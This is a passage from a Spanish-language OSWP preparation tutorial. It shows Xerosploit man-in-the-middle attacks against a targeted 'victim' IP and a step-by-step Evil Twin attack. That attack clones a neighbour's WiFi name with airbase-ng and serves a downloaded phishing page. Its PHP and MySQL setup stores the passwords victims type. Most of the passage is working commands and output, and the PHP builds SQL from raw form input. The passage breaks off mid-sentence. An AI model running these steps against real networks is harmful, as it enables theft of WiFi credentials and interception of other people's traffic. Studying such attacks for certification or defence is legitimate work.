\u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 192.168.1.43 \u2502 80:CE:62:3C:EB:A1 \u2502 192.168.1.1 \u2502  eth0   \u2502   parrot   \u2502\n\u2558\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2567\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255b\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551             \u2551 XeroSploit is a penetration testing toolkit whose goal is to       \u2551\n\u2551 Information \u2551 perform man in the middle attacks for testing purposes.            \u2551\n\u2551             \u2551 It brings various modules that allow to realise efficient attacks. \u2551\n\u2551             \u2551 This tool is Powered by Bettercap and Nmap.                        \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n[+] Please type 'help' to view commands.\n\nXero \u27ae \n</code></pre> <p>Con el comando help, listamos las opciones disponibles:</p> <pre><code>Xero \u27ae help  \n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551          \u2551                                                                \u2551\n\u2551          \u2551 scan     :  Map your network.                                  \u2551\n\u2551          \u2551                                                                \u2551\n\u2551          \u2551 iface    :  Manually set your network interface.               \u2551\n\u2551 COMMANDS \u2551                                                                \u2551\n\u2551          \u2551 gateway  :  Manually set your gateway.                         \u2551\n\u2551          \u2551                                                                \u2551\n\u2551          \u2551 start    :  Skip scan and directly set your target IP address. \u2551\n\u2551          \u2551                                                                \u2551\n\u2551          \u2551 rmlog    :  Delete all xerosploit logs.                        \u2551\n\u2551          \u2551                                                                \u2551\n\u2551          \u2551 help     :  Display this help message.                         \u2551\n\u2551          \u2551                                                                \u2551\n\u2551          \u2551 exit     :  Close Xerosploit.                                  \u2551\n\u2551          \u2551                                                                \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n[+] Please type 'help' to view commands.\n\nXero \u27ae \n</code></pre> <p>Lo primero es realizar un escaneo de la red, por lo que corremos la opci\u00f3n scan:</p> <pre><code>Xero \u27ae scan\n\n[++] Mapping your network ... \n\n[+]\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550[ Devices found on your network ]\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550[+]\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551 IP Address    \u2551 Mac Address       \u2551 Manufacturer  \u2551\n\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\n\u2551 192.168.1.1   \u2551 1C:B0:44:D4:16:77 \u2551 (Unknown)     \u2551\n\u2551 192.168.1.55  \u2551 34:41:5D:46:D1:38 \u2551 (Unknown)     \u2551\n\u2551 192.168.1.60  \u2551 20:34:FB:B1:C5:53 \u2551 (Unknown)     \u2551\n\u2551 192.168.1.201 \u2551 F8:8B:37:E3:32:A2 \u2551 (Unknown)     \u2551\n\u2551 192.168.1.43  \u2551 80:CE:62:3C:EB:A1 \u2551 (This device) \u2551\n\u2551               \u2551                   \u2551               \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n[+] Please choose a target (e.g. 192.168.1.10). Enter 'help' for more information.\n\nXero \u27ae \n</code></pre> <p>Tras identificar a nuestra v\u00edctima, escribimos la direcci\u00f3n IP y se nos listar\u00e1n los distintos modos de ataque:</p> <pre><code>Xero \u27ae 192.168.1.60\n\n[++] 192.168.1.60 has been targeted. \n\n[+] Which module do you want to load ? Enter 'help' for more information.\n\nXero\u00bbmodules \u27ae help\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 pscan       :  Port Scanner                                          \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 dos         :  DoS Attack                                            \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 ping        :  Ping Request                                          \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 injecthtml  :  Inject Html code                                      \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 injectjs    :  Inject Javascript code                                \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 rdownload   :  Replace files being downloaded                        \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 sniff       :  Capturing information inside network packets          \u2551\n\u2551 MODULES \u2551                                                                      \u2551\n\u2551         \u2551 dspoof      :  Redirect all the http traffic to the specified one IP \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 yplay       :  Play background sound in target browser               \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 replace     :  Replace all web pages images with your own one        \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 driftnet    :  View all images requested by your targets             \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 move        :  Shaking Web Browser content                           \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 deface      :  Overwrite all web pages with your HTML code           \u2551\n\u2551         \u2551                                                                      \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n[+] Which module do you want to load ? Enter 'help' for more information.\n\nXero\u00bbmodules \u27ae \n</code></pre> <p>Entre ellos, seleccionaremos la opci\u00f3n replace, que se encargar\u00e1 de llevar a cabo la sustituci\u00f3n de im\u00e1genes sobre la p\u00e1gina web que nuestra v\u00edctima est\u00e9 visitando:</p> <pre><code>Xero\u00bbmodules \u27ae replace\n\n\u250c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2510\n\u2588                                                              \u2588\n\u2588                          Image Replace                       \u2588\n\u2588                                                              \u2588\n\u2588        Replace all web pages images with your own one        \u2588\n\u2514\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2518     \n\n[+] Enter 'run' to execute the 'replace' command.\n\nXero\u00bbmodules\u00bbreplace \u27ae run\n\n[+] Insert your image path. (e.g. /home/capitansalami/pictures/fun.png)\n\nXero\u00bbmodules\u00bbreplace \u27ae \n</code></pre> <p>Especificamos la ruta absoluta de nuestra imagen y comenzar\u00e1 el ataque. Desde que la v\u00edctima navegue a una p\u00e1gina web, todas las im\u00e1genes ser\u00e1n sustituidas por la nuestra:</p> <p></p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#ataque-shaking-web","title":"Ataque Shaking Web","text":"<p>Haciendo uso de la misma herramienta vista en el punto anterior, otra de las acciones de las que dispone xerosploit es el move, por el cual podemos hacer un ataque de tipo Shaking Web, es decir, hacer que cuando nuestra v\u00edctima navegue a una p\u00e1gina, esta se mueva temblando de manera que no se logra leer nada de la misma:</p> <pre><code>Xero \u27ae 192.168.1.60\n\n[++] 192.168.1.60 has been targeted. \n\n[+] Which module do you want to load ? Enter 'help' for more information.\n\nXero\u00bbmodules \u27ae help\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 pscan       :  Port Scanner                                          \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 dos         :  DoS Attack                                            \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 ping        :  Ping Request                                          \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 injecthtml  :  Inject Html code                                      \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 injectjs    :  Inject Javascript code                                \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 rdownload   :  Replace files being downloaded                        \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 sniff       :  Capturing information inside network packets          \u2551\n\u2551 MODULES \u2551                                                                      \u2551\n\u2551         \u2551 dspoof      :  Redirect all the http traffic to the specified one IP \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 yplay       :  Play background sound in target browser               \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 replace     :  Replace all web pages images with your own one        \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 driftnet    :  View all images requested by your targets             \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 move        :  Shaking Web Browser content                           \u2551\n\u2551         \u2551                                                                      \u2551\n\u2551         \u2551 deface      :  Overwrite all web pages with your HTML code           \u2551\n\u2551         \u2551                                                                      \u2551\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n[+] Which module do you want to load ? Enter 'help' for more information.\n\nXero\u00bbmodules \u27ae move\n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#evil-twin-attack","title":"Evil Twin Attack","text":"<p>En este punto, veremos una de las t\u00e9cnicas m\u00e1s comunes para obtener la contrase\u00f1a de una red inal\u00e1mbrica ajena, por medio de t\u00e9cnicas Phishing aplicadas sobre WiFi.</p> <p>Si has le\u00eddo todo lo anterior hasta este punto, habr\u00e1s visto como es muy com\u00fan que las estaciones emitan el paquete Probe Request cuando estas no est\u00e1n asociadas a ning\u00fan AP:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #tshark -i wlan0mon -Y \"wlan.fc.type_subtype==4\" 2&gt;/dev/null\n    1 0.000000000 Apple_7d:1f:e9 \u2192 Broadcast    802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51\n    2 0.019968349 Apple_7d:1f:e9 \u2192 Broadcast    802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51\n</code></pre> <p>Lo que haremos en los siguientes puntos, es justamente aprovechar estos paquetes para asociar a nuestros clientes a un AP falso gestionado por nosotros, desde donde a trav\u00e9s de reglas de enrutamiento y redireccionamientos haremos que estos sean redirigidoa a una p\u00e1gina falsa la cual solicitar\u00e1 la contrase\u00f1a de la red WiFi.</p> <p>La idea es que una vez los clientes v\u00edctima introduzcan las credenciales, estas viajen en texto claro hacia nosotros, pudiendo visualizarlas para posteriormente llevar a cabo la autenticaci\u00f3n contra la red inal\u00e1mbrica ajena.</p> <p>Cabe decir que el paso de solicitar la contrase\u00f1a de la red inal\u00e1mbrica es opcional, de la misma manera podr\u00edamos solicitar alg\u00fan otro tipo de dato.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#creacion-de-fichero-dhcp","title":"Creaci\u00f3n de fichero DHCP","text":"<p>Comenzaremos creando un simple fichero DHCP con nombre dhcpd.conf bajo la ruta /etc/:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/etc]\n\u2514\u2500\u2500\u257c #pwd\n/etc\n\u250c\u2500[root@parrot]\u2500[/etc]\n\u2514\u2500\u2500\u257c #cat dhcpd.conf \nauthoritative;\ndefault-lease-time 600;\nmax-lease-time 7200;\nsubnet 192.168.1.128 netmask 255.255.255.128 {\noption subnet-mask 255.255.255.128;\noption broadcast-address 192.168.1.255;\noption routers 192.168.1.129;\noption domain-name-servers 8.8.8.8;\nrange 192.168.1.130 192.168.1.140;\n}\n</code></pre> <p>En este fichero, indicamos que el promedio de vida m\u00ednimo ser\u00e1 de 600 segundos y el m\u00e1ximos de 7200. Entre este rango, una vez pasado el tiempo estimado se asignar\u00e1 una nueva IP al cliente asociado a nuestro AP (simplemente por hacerla din\u00e1mica).</p> <p>Para evitar entrar en conflicto con la topolog\u00eda de mi red real, como la pasarela es la 192.168.1.1 y algunos de los equipos est\u00e1n configurados en el rango del 192.168.1.2 al 192.168.1.100, lo que he hecho ha sido asignar un nuevo segmento, comprendido entre el rango 192.168.1.130 hasta el 192.168.1.140. Asignaremos como m\u00e1scara de red la 255.255.255.128 y como nueva pasarela la 192.168.1.129. Todo esta configuraci\u00f3n ser\u00e1 gestionada por una nueva interfaz que crearemos en breve.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#configuracion-de-pagina-web","title":"Configuraci\u00f3n de p\u00e1gina web","text":"<p>Nos descargaremos la siguiente plantilla para hacer nuestro ataque: </p> <ul> <li>http://ge.tt/9EyXb5w2</li> </ul>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#inicializacion-de-servicios","title":"Inicializaci\u00f3n de servicios","text":"<p>Iniciamos los servicios mysql y apache2:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/etc]\n\u2514\u2500\u2500\u257c #service apache2 start &amp;&amp; service mysql start\n\u250c\u2500[root@parrot]\u2500[/etc]\n\u2514\u2500\u2500\u257c #echo $?\n0\n</code></pre> <p>Posteriormente comprobamos que nuestro servidor web funciona correctamente:</p> <p></p> <p>Todo este dise\u00f1o es personalizable y se puede retocar sin ning\u00fan tipo de problema desde el HTML. En mi caso, lo voy a dejar as\u00ed.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#creacion-de-base-de-datos-via-mysql","title":"Creaci\u00f3n de base de datos via MYSQL","text":"<p>Ahora bien, si nos fijamos en el ACTION del HTML principal, nos encontramos con esto:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #cat index.html | grep action\n            &lt;tr&gt;&lt;td&gt;&lt;form action=\"dbconnect.php\" method=\"post\"&gt;\n\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #cat dbconnect.php \n&lt;?php\nsession_start();\nob_start();\n$host=\"localhost\";\n$username=\"fakeap\";\n$pass=\"fakeap\";\n$dbname=\"rogue_AP\";\n$tbl_name=\"wpa_keys\";\n\n// Create connection\n$conn = mysqli_connect($host, $username, $pass, $dbname);\n// Check connection\nif (!$conn) {\n    die(\"Connection failed: \" . mysqli_connect_error());\n}\n\n\n$password1=$_POST['password1'];\n$password2=$_POST['password2'];\n\n$sql = \"INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')\";\nif (mysqli_query($conn, $sql)) {\n    echo \"New record created successfully\";\n} else {\n    echo \"Error: \" . $sql . \"&lt;br&gt;\" . mysqli_error($conn);\n}\n\nmysqli_close($conn);\n\nsleep(2);\nheader(\"location:upgrading.html\");\nob_end_flush();\n?&gt;\n</code></pre> <p>El action viene definido por el fichero dbconnect.php, el cual si nos fijamos, lleva a cabo una autenticaci\u00f3n a trav\u00e9s del servicio MYSQL a una tabla y base de datos que no existen. Por tanto, hay que crearla.</p> <p>Crear la base de datos en este caso es bastante sencillo:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #mysql -uroot\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 32\nServer version: 10.1.37-MariaDB-3 Debian buildd-unstable\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]&gt; create database rogue_AP;\nQuery OK, 1 row affected (0.00 sec)\n\nMariaDB [(none)]&gt; use rogue_AP;\nDatabase changed\nMariaDB [rogue_AP]&gt; create table wpa_keys(password1 varchar(32), password2 varchar(32));\nQuery OK, 0 rows affected (0.40 sec)\n\nMariaDB [rogue_AP]&gt; show tables\n    -&gt; ;\n+--------------------+\n| Tables_in_rogue_AP |\n+--------------------+\n| wpa_keys           |\n+--------------------+\n1 row in set (0.00 sec)\n\nMariaDB [rogue_AP]&gt; describe wpa_keys;\n+-----------+-------------+------+-----+---------+-------+\n| Field     | Type        | Null | Key | Default | Extra |\n+-----------+-------------+------+-----+---------+-------+\n| password1 | varchar(32) | YES  |     | NULL    |       |\n| password2 | varchar(32) | YES  |     | NULL    |       |\n+-----------+-------------+------+-----+---------+-------+\n2 rows in set (0.00 sec)\n\nMariaDB [rogue_AP]&gt; \n</code></pre> <p>Una vez creada, ya podemos insertar valores en ella:</p> <pre><code>MariaDB [rogue_AP]&gt; insert into wpa_keys(password1, password2) values (\"test\", \"test\");\nQuery OK, 1 row affected (0.12 sec)\n\nMariaDB [rogue_AP]&gt; select *from wpa_keys;\n+-----------+-----------+\n| password1 | password2 |\n+-----------+-----------+\n| test      | test      |\n+-----------+-----------+\n1 row in set (0.00 sec)\n\nMariaDB [rogue_AP]&gt; \n</code></pre> <p>Si probamos a introducir las credenciales desde la p\u00e1gina web, vemos que nos encontramos con el siguiente error:</p> <p><code>Connection failed: Access denied for user 'fakeap'@'localhost'</code></p> <p>Lo cual es normal, pues est\u00e1 intentando autenticar contra la base de datos haciendo uso del usuario fakeap, el cual no est\u00e1 creado. Por tanto, lo creamos y asignamos m\u00e1ximos privilegios sobre la base de datos creada:</p> <pre><code>MariaDB [rogue_AP]&gt; create user fakeap@localhost identified by 'fakeap';\nQuery OK, 0 rows affected (0.00 sec)\n\nMariaDB [rogue_AP]&gt; grant all privileges on rogue_AP.* to 'fakeap'@'localhost';\nQuery OK, 0 rows affected (0.00 sec)\n</code></pre> <p>Y ahora ya tras introducir las credenciales desde la web, veremos que estas son a\u00f1adidasq a nuestra base de datos:</p> <pre><code>MariaDB [rogue_AP]&gt; select *from wpa_keys;\n+------------------+------------------+\n| password1        | password2        |\n+------------------+------------------+\n| test             | test             |\n| pruebadesdelaweb | pruebadesdelaweb |\n+------------------+------------------+\n2 rows in set (0.00 sec)\n\nMariaDB [rogue_AP]&gt; \n</code></pre>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#creacion-de-falso-punto-de-acceso-via-airbase","title":"Creaci\u00f3n de falso punto de acceso via Airbase","text":"<p>Comenzamos a montar nuestro Fake AP. Para ello, a trav\u00e9s de la utilidad airbase, generaremos un falso punto de acceso en el canal especificado.</p> <p>La idea en este punto, es analizar el entorno y listar los puntos de acceso disponibles. Aquel cuya contrase\u00f1a queramos averiguar, ser\u00e1 el que clonaremos, generando un nuevo punto de acceso OPN con el mismo ESSID.</p> <p>Supongamos que la red cuya contrase\u00f1a quiero averiguar es MOVISTAR_1677, perfecto pues entonces hacemos lo siguiente:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #airbase-ng -e MOVISTAR_1677 -c 7 -P wlan0mon\n22:13:39  Created tap interface at0\n22:13:39  Trying to set MTU on at0 to 1500\n22:13:39  Access Point with BSSID E4:70:B8:D3:93:5C started.\n</code></pre> <p>Con esto, hemos conseguido crear un punto de acceso con nombre MOVISTAR_1677 en el canal 7, sin autenticaci\u00f3n.</p>"},{"location":"Seguridad/Preparaci%C3%B3n%20OSWP/#creacion-de-interfaz-y-asignacion-de-segmentos","title":"Creaci\u00f3n de interfaz y asignaci\u00f3n de segmentos","text":"<p>Ya con el punto de acceso creado, comenzamos creando una nueva interfaz at0, la cual en cuanto a propiedades debe ser equivalente al fichero dhcpd.conf previamente creado:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #ifconfig at0 192.168.1.129 netmask 255.255.255.128\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #ifconfig\nat0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255\n        inet6 fe80::e670:b8ff:fed3:935c  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether e4:70:b8:d3:93:5c  txqueuelen 1000  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 57  bytes 8828 (8.6 KiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\neth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 192.168.1.43  netmask 255.255.255.0  broadcast 192.168.1.255\n        inet6 fe80::c114:795c:5d1f:78a7  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 80:ce:62:3c:eb:a1  txqueuelen 1000  (Ethernet)\n        RX packets 6777682  bytes 8286953540 (7.7 GiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 3292154  bytes 880484597 (839.6 MiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 772442  bytes 1353509541 (1.2 GiB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 772442  bytes 1353509541 (1.2 GiB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nwlan0mon: flags=867&lt;UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI&gt;  mtu 1800\n        unspec E4-70-B8-D3-93-5C-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)\n        RX packets 1179679  bytes 610643779 (582.3 MiB)\n        RX errors 0  dropped 1078475  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n\u250c\u2500[root@parrot]\u2500[/home/s4vitar]\n\u2514\u2500\u2500\u257c #\n</code></pre> <p>Os recuerdo que el tercer comando aplicado es necesario para este caso, igual que cuando hac\u00edamos envenenamiento ARP, pues para este caso necesitamos contar con el 